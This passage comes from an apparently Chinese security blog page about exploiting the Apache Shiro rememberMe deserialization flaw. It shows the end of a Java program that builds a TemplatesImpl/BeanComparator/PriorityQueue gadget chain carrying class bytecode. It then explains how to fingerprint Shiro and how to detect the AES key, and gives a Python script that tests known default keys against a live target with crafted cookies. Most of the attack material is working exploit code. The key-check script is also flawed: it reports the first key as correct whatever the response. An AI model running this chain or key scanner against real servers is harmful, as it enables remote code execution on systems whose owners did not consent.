+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>unserialize</span>(String Filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(Filename));
+</span></span><span style=display:flex><span>        Object obj <span style=color:#f92672>=</span> ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> obj;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> code <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;D:\\JavaSecTestCode\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>        setFieldValue(templates,<span style=color:#e6db74>&#34;_name&#34;</span>,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>        setFieldValue(templates,<span style=color:#e6db74>&#34;_bytecodes&#34;</span>,<span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span>{code});
+</span></span><span style=display:flex><span>        setFieldValue(templates,<span style=color:#e6db74>&#34;_tfactory&#34;</span>,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//templates.newTransformer();</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> BeanComparator<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> beanComparator <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> BeanComparator<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> PriorityQueue<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> queue <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PriorityQueue<span style=color:#f92672>&lt;&gt;</span>(2, beanComparator);
+</span></span><span style=display:flex><span>        queue.<span style=color:#a6e22e>add</span>(1);
+</span></span><span style=display:flex><span>        queue.<span style=color:#a6e22e>add</span>(1);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        setFieldValue(beanComparator, <span style=color:#e6db74>&#34;property&#34;</span>, <span style=color:#e6db74>&#34;outputProperties&#34;</span>);
+</span></span><span style=display:flex><span>        setFieldValue(queue,<span style=color:#e6db74>&#34;queue&#34;</span>,<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{templates,templates});
+</span></span><span style=display:flex><span>        serialize(queue);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>但是这里存在 shiro 版本问题。</p><p>yso 中的 CB 版本是1.9，而 shiro 自带的是1.8.3，所以服务器会报错。</p><p>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 <code>serialVersionUID</code> 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 <code>serialVersionUID</code> 不同，则反序列化就会异常退出，避免后续的未知隐患。</p><p>commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p><h2 id=漏洞探测>漏洞探测
+<a class=anchor href=#%e6%bc%8f%e6%b4%9e%e6%8e%a2%e6%b5%8b>#</a></h2><h3 id=指纹识别>指纹识别
+<a class=anchor href=#%e6%8c%87%e7%ba%b9%e8%af%86%e5%88%ab>#</a></h3><p>在利用 shiro 漏洞的时候需要判断应用是否用到了 shiro，在请求包的 Cookie 中为<code>rememberMe</code>字段赋任意值，收到返回包的 Set-Cookie 中存在<code>rememberMe=deleteMe</code>字段，说明目标有使用 shiro 框架，可以尝试进一步测试。</p><h3 id=aes-密钥判断>AES 密钥判断
+<a class=anchor href=#aes-%e5%af%86%e9%92%a5%e5%88%a4%e6%96%ad>#</a></h3><p>shiro 1.2.4 以上的版本官方就移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置就默认动态生成，从而降低了固定密钥泄露的风险。但是升级到1.2.4以上的版本，很多开源项目会自己设定密钥，这就可以收集密钥的集合或者对密钥进行爆破。</p><p>针对密钥是否正确有一种思路：当密钥不正确或类型转换异常的时候，目标响应中包含<code>Set-Cookie：rememberMe=deleteMe</code>字段，而当密钥正确且没有类型转换异常时返回包就不存在该字段。</p><p>因此我们需要构造 payload 排除类型转换错误，进而准确判断密钥。</p><p>shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p><p>一个大佬的加密脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> uuid
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encrypt_AES_GCM</span>(msg, secretKey):
+</span></span><span style=display:flex><span>    aesCipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(secretKey, AES<span style=color:#f92672>.</span>MODE_GCM)
+</span></span><span style=display:flex><span>    ciphertext, authTag <span style=color:#f92672>=</span> aesCipher<span style=color:#f92672>.</span>encrypt_and_digest(msg)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (ciphertext, aesCipher<span style=color:#f92672>.</span>nonce, authTag)
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encode_rememberme</span>(target):
+</span></span><span style=display:flex><span>    keys <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;kPH+bIxk5D2deZiIxcaaaA==&#39;</span>, <span style=color:#e6db74>&#39;4AvVhmFLUs0KTA3Kprsdag==&#39;</span>,<span style=color:#e6db74>&#39;66v1O8keKNV3TTcGPK1wzg==&#39;</span>, <span style=color:#e6db74>&#39;SDKOLKn2J1j/2BHjeZwAoQ==&#39;</span>]     <span style=color:#75715e># 此处简单列举几个密钥</span>
+</span></span><span style=display:flex><span>    BS <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>block_size
+</span></span><span style=display:flex><span>    pad <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> s: s <span style=color:#f92672>+</span> ((BS <span style=color:#f92672>-</span> len(s) <span style=color:#f92672>%</span> BS) <span style=color:#f92672>*</span> chr(BS <span style=color:#f92672>-</span> len(s) <span style=color:#f92672>%</span> BS))<span style=color:#f92672>.</span>encode()
+</span></span><span style=display:flex><span>    mode <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>MODE_CBC
+</span></span><span style=display:flex><span>    iv <span style=color:#f92672>=</span> uuid<span style=color:#f92672>.</span>uuid4()<span style=color:#f92672>.</span>bytes
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    file_body <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(<span style=color:#e6db74>&#39;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> key <span style=color:#f92672>in</span> keys:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>            <span style=color:#75715e># CBC加密</span>
+</span></span><span style=display:flex><span>            encryptor <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(base64<span style=color:#f92672>.</span>b64decode(key), mode, iv)
+</span></span><span style=display:flex><span>            base64_ciphertext <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(iv <span style=color:#f92672>+</span> encryptor<span style=color:#f92672>.</span>encrypt(pad(file_body)))
+</span></span><span style=display:flex><span>            res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(target, cookies<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;rememberMe&#39;</span>: base64_ciphertext<span style=color:#f92672>.</span>decode()},timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>,verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> res<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;Set-Cookie&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>&#34;正确KEY ：&#34;</span> <span style=color:#f92672>+</span> key)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> key
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;rememberMe=deleteMe;&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> res<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;Set-Cookie&#34;</span>):
+</span></span><span style=display:flex><span>                    print(<span style=color:#e6db74>&#34;正确key:&#34;</span> <span style=color:#f92672>+</span> key)
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> key
+</span></span><span style=display:flex><span>            <span style=color:#75715e># GCM加密</span>
+</span></span><span style=display:flex><span>            encryptedMsg <span style=color:#f92672>=</span> encrypt_AES_GCM(file_body, base64<span style=color:#f92672>.</span>b64decode(key))
+</span></span><span style=display:flex><span>            base64_ciphertext <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(encryptedMsg[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> encryptedMsg[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>+</span> encryptedMsg[<span style=color:#ae81ff>2</span>])
+</span></span><span style=display:flex><span>            res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(target, cookies<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;rememberMe&#39;</span>: base64_ciphertext<span style=color:#f92672>.</span>decode()}, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> res<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;Set-Cookie&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>&#34;正确KEY:&#34;</span> <span style=color:#f92672>+</span> key)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> key
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;rememberMe=deleteMe;&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> res<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;Set-Cookie&#34;</span>):
+</span></span><span style=display:flex><span>                    print(<span style=color:#e6db74>&#34;正确key:&#34;</span> <span style=color:#f92672>+</span> key)
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> key
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;正确key:&#34;</span> <span style=color:#f92672>+</span> key)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> key
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+</span></span><span style=display:flex><span>            print(e)
+</span></span></code></pre></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#漏洞原理>漏洞原理</a></li><li><a href=#漏洞分析>漏洞分析</a><ul><li><a href=#分析解密过程>分析解密过程</a></li><li><a href=#分析加密过程>分析加密过程</a></li></ul></li><li><a href=#漏洞利用>漏洞利用</a><ul><li><a href=#漏洞利用思路>漏洞利用思路</a></li></ul></li><li><a href=#漏洞探测>漏洞探测</a><ul><li><a href=#指纹识别>指纹识别</a></li><li><a href=#aes-密钥判断>AES 密钥判断</a></li></ul></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
